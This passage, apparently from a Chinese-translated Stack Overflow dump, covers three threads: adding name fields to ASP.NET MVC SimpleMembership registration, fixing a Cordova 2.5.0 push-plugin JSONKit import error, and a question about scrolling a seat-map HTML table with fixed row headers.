public class RegisterModel
{
    ....
    public string FirstName{get;set;}    
    public string LastName{get;set;}
} 
```

希望这对你有用

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-13T23:11:55.607

我认为您正在寻求这样做。

**用户详情**

```
public class UserDetail 
 {
     //This is property mapping, UserId will be the same as the Membership UserId and UserProfile UserId
     [Key]
     [ForeignKey("UserProfile")]
     [HiddenInput(DisplayValue = false)]
     public int UserId { get; set; }

     public string FirstName{get;set;}    
     public string LastName{get;set;}

     public UserProfile UserProfile { get; set; } 
 } 
```

**注册模型**

```
public class RegisterModel
{
    [Required]
    [Display(Name = "User name")]
    public string UserName { get; set; }

    [Required]
    [StringLength(100, ErrorMessage = "The {0} must be at least {2} characters long.", MinimumLength = 6)]
    [DataType(DataType.Password)]
    [Display(Name = "Password")]
    public string Password { get; set; }

    [DataType(DataType.Password)]
    [Display(Name = "Confirm password")]
    [Compare("Password", ErrorMessage = "The password and confirmation password do not match.")]
    public string ConfirmPassword { get; set; }

    [Required]
    public string FirstName{get;set;}

    [Required]   
    public string LastName{get;set;}
 } 
```

**注册动作**

```
//
    // GET: /Account/Register

    [AllowAnonymous]
    public ActionResult Register()
    {
        return View();
    }

    //
    // POST: /Account/Register

    [HttpPost]
    [AllowAnonymous]
    [ValidateAntiForgeryToken]
    public ActionResult Register(RegisterModel model)
    {
        if (ModelState.IsValid)
        {
            var db = new UsersContext();
            // Attempt to register the user
            try
            {
               var userProfile = WebSecurity.CreateUserAndAccount(model.UserName, model.Password, null, false);

                //var userProfile= db.UserProfile.SingleOrDefault(u => u.UserName == model.UserName);

                if (userProfile!= null) //This way Userdetail is only created if UserProfile exists so that it can retrieve the foreign key
                {
                    var userDetail = new UserDetail
                                           {
                                               UserProfile = userProfile,
                                               FirstName = model.FirstName,
                                               LastName = model.LastName
                                           };                                                

                    db.UserDetails.Add(userDetail);
                    db.SaveChanges();
                }                    
            }
            catch (MembershipCreateUserException e)
            {
                ModelState.AddModelError("", ErrorCodeToString(e.StatusCode));
            }
        }

        // If we got this far, something failed, redisplay form
        return View(model);
    } 
```

**编辑**

根据您设置上下文和存储库的方式，每个 POCO 类都需要如下所示的内容

```
 public DbSet<UserProfile> UserProfiles { get; set; }
    IQueryable<UserProfile> IDataSource.UserProfiles
    {
        get { return UserProfiles; }
    } 
```

除了 SimpleMembership 表之外，您还需要将以下内容添加到您的上下文`many-to-many`中`Membership and Roles`

```
 protected override void OnModelCreating(DbModelBuilder modelBuilder)
    {
        modelBuilder.Entity<Membership>()
          .HasMany<Role>(r => r.Roles)
          .WithMany(u => u.Members)
          .Map(m =>
          {
              m.ToTable("webpages_UsersInRoles");
              m.MapLeftKey("UserId");
              m.MapRightKey("RoleId");
          });
    } 
```

# ios - Cordova/PhoneGap-2.5.0 的推送通知插件不起作用

> ID：15357687
> 
> 赞同：3
> 
> 时间：2013-03-12T09:37:37.473
> 
> 标签：ios, cordova, push-notification

我正在尝试在我的 cordava iOS 应用程序上启用推送通知。

我正在关注本教程：[Apple Push Notifications with PhoneGap](http://devgirl.org/2012/10/19/tutorial-apple-push-notifications-with-phonegap-part-1/#comment-13566)。

它上面的示例代码运行良好，但问题是它使用的是旧版本的cordova（2.1.0）。

当我尝试使用最新版本 2.5.0 时，会出现一些问题。

1) Cordova 项目中没有 JSONKit.m/h 类。pushnotifications 插件似乎需要这个类才能工作。但是，如果我评论导入此类的行，我会解决不存在文件的错误。但是我收到一些警告...

2）在我评论该`#import <Cordova/JsonKit.h>`行之后，推送通知仅在应用程序在后台运行时才起作用。如果应用程序在前台并且我发送推送，则应用程序崩溃。

有任何想法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-14T18:32:37.700

Cordova 2.4+ 没有 JSONKit。

你应该做的是改变这一行：

```
#import <Cordova/JSONKit.h> 
```

到

```
#import <Cordova/CDVJSON.h> 
```

它应该可以工作。

# javascript - td的水平和垂直滚动，th应该是固定的

> ID：15357690
> 
> 赞同：0
> 
> 时间：2013-03-12T09:37:41.150
> 
> 标签：javascript, jquery, iscroll

“th”值应该是固定的，“td”值应该滚动，如果“th”高度超过 100px，那么“then”也应该随着相应的“td”滚动。“th”和“td”的数量是动态的，请帮助我。

```
<table cellspacing="0" cellpadding="0" class="selectionContainer"
    id="mySeatContainer">
    <tbody>
        <tr class="rowNode" id="mySeatRow0">
            <th></th>
            <td>
                <span class="colNonSeat" tag="1,1" id="mySeatCol1_1">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,2" id="mySeatCol1_2">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,3" id="mySeatCol1_3">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,4" id="mySeatCol1_4">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,5" id="mySeatCol1_5">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,6" id="mySeatCol1_6">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,7" id="mySeatCol1_7">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,8" id="mySeatCol1_8">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,9" id="mySeatCol1_9">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,10" id="mySeatCol1_10">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,11" id="mySeatCol1_11">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,12" id="mySeatCol1_12">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,13" id="mySeatCol1_13">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,14" id="mySeatCol1_14">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,15" id="mySeatCol1_15">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,16" id="mySeatCol1_16">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,17" id="mySeatCol1_17">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,18" id="mySeatCol1_18">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,19" id="mySeatCol1_19">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,20" id="mySeatCol1_20">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,21" id="mySeatCol1_21">&nbsp;
                </span>
            </td>
        </tr>
        <tr class="rowNode" id="mySeatRow1">
            <th class="rowLabel" tag="" id="RowB">B</th>
            <td>
                <span class="colAccessible colAvailable colPointer" tag="2,1"
                    id="mySeatCol2_1">&nbsp;
                </span>
            </td>
            <td>
                <span class="colCompanion colAvailable colPointer" tag="2,2"
                    id="mySeatCol2_2">&nbsp;
                </span>
            </td>
            <td>
                <span class="colAccessible colAvailable colPointer" tag="2,3"
                    id="mySeatCol2_3">&nbsp;
                </span>
            </td>
            <td>
                <span class="colCompanion colAvailable colPointer" tag="2,4"
                    id="mySeatCol2_4">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,5"
                    id="mySeatCol2_5">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="2,6" id="mySeatCol2_6">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,7"
                    id="mySeatCol2_7">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,8"
                    id="mySeatCol2_8">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,9"
                    id="mySeatCol2_9">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,10"
                    id="mySeatCol2_10">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,11"
                    id="mySeatCol2_11">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,12"
                    id="mySeatCol2_12">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,13"
                    id="mySeatCol2_13">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,14"
                    id="mySeatCol2_14">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,15"
                    id="mySeatCol2_15">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,16"
                    id="mySeatCol2_16">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,17"
                    id="mySeatCol2_17">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,18"
                    id="mySeatCol2_18">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,19"
                    id="mySeatCol2_19">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,20"
                    id="mySeatCol2_20">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,21"
                    id="mySeatCol2_21">&nbsp;
                </span>
            </td>
        </tr>
        <tr class="rowNode" id="mySeatRow2">
            <th class="rowLabel" tag="" id="RowC">C</th>
            <td>
                <span class="colNonSeat" tag="3,1" id="mySeatCol3_1">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="3,2"
                    id="mySeatCol3_2">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="3,3"
                    id="mySeatCol3_3">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="3,4"
                    id="mySeatCol3_4">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="3,5"
                    id="mySeatCol3_5">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="3,6" id="mySeatCol3_6">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="3,7"
                    id="mySeatCol3_7">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="3,8"
                    id="mySeatCol3_8">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="3,9"
                    id="mySeatCol3_9">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="3,10"
                    id="mySeatCol3_10">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="3,11"
                    id="mySeatCol3_11">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="3,12"
                    id="mySeatCol3_12">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="3,13"
                    id="mySeatCol3_13">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="3,14"
                    id="mySeatCol3_14">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="3,15"
                    id="mySeatCol3_15">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="3,16"
                    id="mySeatCol3_16">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="3,17"
                    id="mySeatCol3_17">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="3,18"
                    id="mySeatCol3_18">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="3,19"
                    id="mySeatCol3_19">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="3,20"
                    id="mySeatCol3_20">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="3,21" id="mySeatCol3_21">&nbsp;
                </span>
            </td>
        </tr>
        <tr class="rowNode" id="mySeatRow3">
            <th class="rowLabel" tag="" id="RowD">D</th>
            <td>
                <span class="colAisle" tag="4,1" id="mySeatCol4_1">&nbsp;
                </span>
            </td>
            <td>
                <span class="colAisle" tag="4,2" id="mySeatCol4_2">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="4,3"
                    id="mySeatCol4_3">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveCenter colAvailable colPointer" tag="4,4"
                    id="mySeatCol4_4">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="4,5"
                    id="mySeatCol4_5">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="4,6" id="mySeatCol4_6">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="4,7"
                    id="mySeatCol4_7">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="4,8"
                    id="mySeatCol4_8">&nbsp;
                </span>
            </td>
            <td>
                <span class="colRecliner colAvailable colPointer" tag="4,9"
                    id="mySeatCol4_9">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="4,10"
                    id="mySeatCol4_10">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="4,11"
                    id="mySeatCol4_11">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="4,12"
                    id="mySeatCol4_12">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveCenter colAvailable colPointer" tag="4,13"
                    id="mySeatCol4_13">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="4,14"
                    id="mySeatCol4_14">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="4,15"
                    id="mySeatCol4_15">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="4,16"
                    id="mySeatCol4_16">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="4,17"
                    id="mySeatCol4_17">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveCenter colAvailable colPointer" tag="4,18"
                    id="mySeatCol4_18">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="4,19"
                    id="mySeatCol4_19">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="4,20" id="mySeatCol4_20">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="4,21" id="mySeatCol4_21">&nbsp;
                </span>
            </td>
        </tr>
        <tr class="rowNode" id="mySeatRow4">
            <th class="rowLabel" tag="" id="RowE">E</th>
            <td>
                <span class="colNonSeat" tag="5,1" id="mySeatCol5_1">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="5,2" id="mySeatCol5_2">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="5,3"
                    id="mySeatCol5_3">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveCenter colAvailable colPointer" tag="5,4"
                    id="mySeatCol5_4">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="5,5"
                    id="mySeatCol5_5">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="5,6" id="mySeatCol5_6">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="5,7"
                    id="mySeatCol5_7">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveCenter colAvailable colPointer" tag="5,8"
                    id="mySeatCol5_8">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="5,9"
                    id="mySeatCol5_9">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="5,10" id="mySeatCol5_10">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="5,11" id="mySeatCol5_11">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="5,12" id="mySeatCol5_12">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="5,13" id="mySeatCol5_13">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="5,14" id="mySeatCol5_14">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="5,15" id="mySeatCol5_15">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="5,16" id="mySeatCol5_16">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="5,17"
                    id="mySeatCol5_17">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveCenter colAvailable colPointer" tag="5,18"
                    id="mySeatCol5_18">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="5,19"
                    id="mySeatCol5_19">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="5,20" id="mySeatCol5_20">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="5,21" id="mySeatCol5_21">&nbsp;
                </span>
            </td>
        </tr>
        <tr class="rowNode" id="mySeatRow5">
            <th class="rowLabel" tag="" id="RowF">F</th>
            <td>
                <span class="colAccessible colAvailable colPointer" tag="6,1"
                    id="mySeatCol6_1">&nbsp;
                </span>
            </td>
            <td>
                <span class="colCompanion colAvailable colPointer" tag="6,2"
                    id="mySeatCol6_2">&nbsp;
                </span>
            </td>
            <td>
                <span class="colAccessible colAvailable colPointer" tag="6,3"
                    id="mySeatCol6_3">&nbsp;
                </span>
            </td>
            <td>
                <span class="colCompanion colAvailable colPointer" tag="6,4"
                    id="mySeatCol6_4">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,5"
                    id="mySeatCol6_5">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="6,6" id="mySeatCol6_6">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,7"
                    id="mySeatCol6_7">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,8"
                    id="mySeatCol6_8">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,9"
                    id="mySeatCol6_9">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,10"
                    id="mySeatCol6_10">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,11"
                    id="mySeatCol6_11">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,12"
                    id="mySeatCol6_12">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,13"
                    id="mySeatCol6_13">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,14"
                    id="mySeatCol6_14">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,15"
                    id="mySeatCol6_15">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,16"
                    id="mySeatCol6_16">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,17"
                    id="mySeatCol6_17">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,18"
                    id="mySeatCol6_18">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="6,19"
                    id="mySeatCol6_19">&nbsp;
                </span>
            </td>
            <td>
                <span class="colAisle" tag="6,20" id="mySeatCol6_20">&nbsp;
                </span>
            </td>
            <td>
                <span class="colAisle" tag="6,21" id="mySeatCol6_21">&nbsp;
                </span>
            </td>
        </tr>
        <tr class="rowNode" id="mySeatRow6">
            <th class="rowLabel" tag="" id="RowG">G</th>
            <td>
                <span class="colNonSeat" tag="7,1" id="mySeatCol7_1">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="7,2"
                    id="mySeatCol7_2">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="7,3"
                    id="mySeatCol7_3">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="7,4"
                    id="mySeatCol7_4">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="7,5"
                    id="mySeatCol7_5">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="7,6" id="mySeatCol7_6">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="7,7"
                    id="mySeatCol7_7">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="7,8"
                    id="mySeatCol7_8">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="7,9"
                    id="mySeatCol7_9">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="7,10"
                    id="mySeatCol7_10">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="7,11"
                    id="mySeatCol7_11">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="7,12"
                    id="mySeatCol7_12">&nbsp;
                </span>
            </td>
            <td>
                <span class="colPillar colAvailable" tag="7,13" id="mySeatCol7_13">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="7,14"
                    id="mySeatCol7_14">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="7,15"
                    id="mySeatCol7_15">&nbsp;
                </span>
            </td>
            <td>
                <span class="colPillar colAvailable" tag="7,16" id="mySeatCol7_16">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="7,17"
                    id="mySeatCol7_17">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="7,18"
                    id="mySeatCol7_18">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="7,19"
                    id="mySeatCol7_19">&nbsp;
                </span>
            </td>
            <td>
                <span class="colAisle" tag="7,20" id="mySeatCol7_20">&nbsp;
                </span>
            </td>
            <td>
                <span class="colAisle" tag="7,21" id="mySeatCol7_21">&nbsp;
                </span>
            </td>
        </tr>
        <tr class="rowNode" id="mySeatRow7">
            <th class="rowLabel" tag="" id="RowH">H</th>
            <td>
                <span class="colAisle" tag="8,1" id="mySeatCol8_1">&nbsp;
                </span>
            </td>
            <td>
                <span class="colAisle" tag="8,2" id="mySeatCol8_2">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="8,3"
                    id="mySeatCol8_3">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveCenter colAvailable colPointer" tag="8,4"
                    id="mySeatCol8_4">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="8,5"
                    id="mySeatCol8_5">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="8,6" id="mySeatCol8_6">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="8,7"
                    id="mySeatCol8_7">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="8,8"
                    id="mySeatCol8_8">&nbsp;
                </span>
            </td>
            <td>
                <span class="colRecliner colAvailable colPointer" tag="8,9"
                    id="mySeatCol8_9">&nbsp;
                </span>
            </td>
            <td>
                <span class="colAisle" tag="8,10" id="mySeatCol8_10">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="8,11" id="mySeatCol8_11">&nbsp;
                </span>
            </td>
            <td>
                <span class="colAccessible colAvailable colPointer" tag="8,12"
                    id="mySeatCol8_12">&nbsp;
                </span>
            </td>
            <td>
                <span class="colCompanion colAvailable colPointer" tag="8,13"
                    id="mySeatCol8_13">&nbsp;
                </span>
            </td>
            <td>
                <span class="colAccessible colAvailable colPointer" tag="8,14"
                    id="mySeatCol8_14">&nbsp;
                </span>
            </td>
            <td>
                <span class="colCompanion colAvailable colPointer" tag="8,15"
                    id="mySeatCol8_15">&nbsp;
                </span>
            </td>
            <td>
                <span class="colTable colAvailable" tag="8,16" id="mySeatCol8_16">&nbsp;
                </span>
            </td>
            <td>
                <span class="colDBox colAvailable colPointer" tag="8,17"
                    id="mySeatCol8_17">&nbsp;
                </span>
            </td>
            <td>
                <span class="colDBox colAvailable colPointer" tag="8,18"
                    id="mySeatCol8_18">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="8,19"
                    id="mySeatCol8_19">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveCenter colAvailable colPointer" tag="8,20"
                    id="mySeatCol8_20">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="8,21"
                    id="mySeatCol8_21">&nbsp;
                </span>
            </td>
        </tr>
    </tbody>
</table>
<table cellspacing="0" cellpadding="0" class="selectionContainer"
    id="mySeatContainer">
    <tbody>
        <tr class="rowNode" id="mySeatRow0">
            <th></th>
            <td>
                <span class="colNonSeat" tag="1,1" id="mySeatCol1_1">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,2" id="mySeatCol1_2">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,3" id="mySeatCol1_3">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,4" id="mySeatCol1_4">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,5" id="mySeatCol1_5">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,6" id="mySeatCol1_6">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,7" id="mySeatCol1_7">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,8" id="mySeatCol1_8">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,9" id="mySeatCol1_9">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,10" id="mySeatCol1_10">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,11" id="mySeatCol1_11">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,12" id="mySeatCol1_12">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,13" id="mySeatCol1_13">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,14" id="mySeatCol1_14">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,15" id="mySeatCol1_15">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,16" id="mySeatCol1_16">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,17" id="mySeatCol1_17">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,18" id="mySeatCol1_18">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,19" id="mySeatCol1_19">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,20" id="mySeatCol1_20">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="1,21" id="mySeatCol1_21">&nbsp;
                </span>
            </td>
        </tr>
        <tr class="rowNode" id="mySeatRow1">
            <th class="rowLabel" tag="" id="RowB">B</th>
            <td>
                <span class="colAccessible colAvailable colPointer" tag="2,1"
                    id="mySeatCol2_1">&nbsp;
                </span>
            </td>
            <td>
                <span class="colCompanion colAvailable colPointer" tag="2,2"
                    id="mySeatCol2_2">&nbsp;
                </span>
            </td>
            <td>
                <span class="colAccessible colAvailable colPointer" tag="2,3"
                    id="mySeatCol2_3">&nbsp;
                </span>
            </td>
            <td>
                <span class="colCompanion colAvailable colPointer" tag="2,4"
                    id="mySeatCol2_4">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,5"
                    id="mySeatCol2_5">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="2,6" id="mySeatCol2_6">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNormal colAvailable colPointer" tag="2,7"
                    id="mySeatCol2_7">&nbsp;
                </span>
            </td>

        </tr>
        <tr class="rowNode" id="mySeatRow2">
            <th class="rowLabel" tag="" id="RowC">C</th>
            <td>
                <span class="colNonSeat" tag="3,1" id="mySeatCol3_1">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="3,2"
                    id="mySeatCol3_2">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="3,3"
                    id="mySeatCol3_3">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="3,4"
                    id="mySeatCol3_4">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveRight colAvailable colPointer" tag="3,5"
                    id="mySeatCol3_5">&nbsp;
                </span>
            </td>
            <td>
                <span class="colNonSeat" tag="3,6" id="mySeatCol3_6">&nbsp;
                </span>
            </td>
            <td>
                <span class="colLoveLeft colAvailable colPointer" tag="3,7"
                    id="mySeatCol3_7">&nbsp;
                </span>
            </td>
        </tr>
    </tbody>
</table> 
```

* * *

## 回答 #1

> 赞同：0
> 
